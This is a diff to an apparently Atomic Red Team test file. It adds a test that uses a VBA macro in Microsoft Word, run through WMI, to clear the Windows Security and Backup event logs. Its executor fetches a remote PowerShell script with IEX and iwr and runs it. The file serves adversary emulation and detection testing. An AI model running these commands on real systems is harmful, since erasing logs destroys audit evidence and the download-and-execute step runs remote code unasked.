@@ -32,3 +32,29 @@ atomic_tests:
       Get-EventLog -list
     name: powershell
     elevation_required: true
+- name: Clear Event Logs via VBA
+  auto_generated_guid: 1b682d84-f075-4f93-9a89-8a8de19ffd6e
+  description: |
+    This module utilizes WMI via VBA to clear the Security and Backup eventlogs from the system. 
+
+    Elevation is required for this module to execute properly, otherwise WINWORD will throw an "Access Denied" error
+  supported_platforms:
+  - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Microsoft Word must be installed
+    prereq_command: |
+      try {
+        New-Object -COMObject "Word.Application" | Out-Null
+        Stop-Process -Name "winword"
+        exit 0
+      } catch { exit 1 }
+    get_prereq_command: |
+      Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+  executor:
+    command: |
+      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+      Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt" -officeProduct "Word" -sub "ClearLogs"
+    name: powershell
+    elevation_required: true
